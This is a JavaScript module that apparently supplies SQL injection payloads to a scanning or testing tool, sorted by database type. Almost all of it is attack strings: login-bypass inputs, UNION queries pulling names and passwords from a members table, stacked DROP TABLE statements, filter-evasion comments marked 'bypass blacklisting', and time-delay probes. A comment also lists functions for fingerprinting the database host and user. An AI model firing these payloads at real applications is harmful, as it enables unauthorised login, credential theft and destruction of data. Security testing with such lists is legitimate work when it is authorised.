const SQLi = module.exports = {
  // SQL Injections

  // Hex Values or ASCii
  /*
    https://www.branah.com/ascii-converter
    */

  /*
    Variable/Function		Output
    @@hostname	:	Current Hostname
    @@tmpdir	:	Tept Directory
    @@datadir	:	Data Directory
    @@version	:	Version of DB
    @@basedir	:	Base Directory
    user()	:	Current User
    database()	:	Current Database
    version()	:	Version
    schema()	:	current Database
    UUID()	:	System UUID key
    current_user()	:	Current User
    current_user	:	Current User
    system_user()	:	Current Sustem user
    session_user()	:	Session user
    @@GLOBAL.have_symlink	:	Check if Symlink Enabled or Disabled
    @@GLOBAL.have_ssl	:	Check if it have ssl or not
    */

  // two variable objects that contain sql injections in arrays: user & browser_pass
  // arrays named
  // M for MySQL
  // S for SQL Server
  // P for PostgreSQL
  // O for Oracle

  // example = ['tablename', 'sampletable', 'members', 'products', 'id', "'A'", "'B'", 'CASE', 'header', 'txt', 'news', 'name', 'pass', 'header']


  //MODIFY DataChange rmeove DROPS
  fingerPrint: ['/*! MYSQL Special SQL */', 'SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members', 'BEGIN IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;'],
  test: [],
  M: [{ Form: ["admin' --",
    "admin' #",
    "admin'/*",
    "SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' ",
    'SELECT/*avoid-spaces*/password/**/FROM/**/Members',
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "SELECT IF(1=1,'true','false')",
    "SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' ",
    'SELECT/*avoid-spaces*/password/**/FROM/**/Members',
  ] },
  { DataChange: ['DROP sampletable;-- ',
    'DROP sampletable;#',
    'DROP/*comment*/sampletable',
    'DR/**/OP/*bypass blacklisting*/sampletable',
    'SELECT * FROM products WHERE id = 10; DROP members--',
    'SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members',
    "SELECT header, txt FROM news ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",
    'SELECT /*!32302 1/0, */ 1 FROM tablename',
    'SELECT /*!32302 10, */ 1 FROM tablename',
    "' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",
  ] },
  ],
  S: [{ Form: ["SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' ",
    'SELECT/*avoid-spaces*/password/**/FROM/**/Members',
    'SELECT * FROM members; DROP members--',
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",
    "if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0",
    "if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 10",
  ] },
  { DataChange: ['DROP sampletable;-- ',
    'DROP/*comment*/sampletable',
    'DR/**/OP/*bypass blacklisting*/sampletable',
    'SELECT * FROM members; DROP members--',
    'SELECT * FROM products WHERE id = 10; DROP members--',
    'SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members',
    "SELECT header, txt FROM news ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",
  ] },
  ],
  P: [{ Form: ["admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' ",
  ] },
  { DataChange: ['SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members',
    "SELECT header, txt FROM news ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",
    "' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",
    'SELECT * FROM products WHERE id = 10; DROP members--',
  ] },
  ],
  G: [{ Form: ["admin' --",
    "admin' #",
    "admin'/*",
    "SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' ",
    'SELECT/*avoid-spaces*/password/**/FROM/**/Members',
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "SELECT IF(1=1,'true','false')",
    "SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' ",
    'SELECT/*avoid-spaces*/password/**/FROM/**/Members',
    "SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' ",
    'SELECT/*avoid-spaces*/password/**/FROM/**/Members',
    'SELECT * FROM members; DROP members--',
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",
    "if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0",
    "if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 10",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' "] },
  { DataChange: [
    'DROP sampletable;-- ',
    'DROP sampletable;#',
    'DROP/*comment*/sampletable',
    'DR/**/OP/*bypass blacklisting*/sampletable',
    'SELECT * FROM products WHERE id = 10; DROP members--',
    'SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members',
    "SELECT header, txt FROM news ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",
    'SELECT /*!32302 1/0, */ 1 FROM tablename',
    'SELECT /*!32302 10, */ 1 FROM tablename',
    "' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",
    'DROP sampletable;-- ',
    'DROP/*comment*/sampletable',
    'DR/**/OP/*bypass blacklisting*/sampletable',
    'SELECT * FROM members; DROP members--',
    'SELECT * FROM products WHERE id = 10; DROP members--',
    'SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members',
    "SELECT header, txt FROM news ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",
    'SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members',
    "SELECT header, txt FROM news ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",
    "' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",
    'SELECT * FROM products WHERE id = 10; DROP members--'],
  },
  ]
}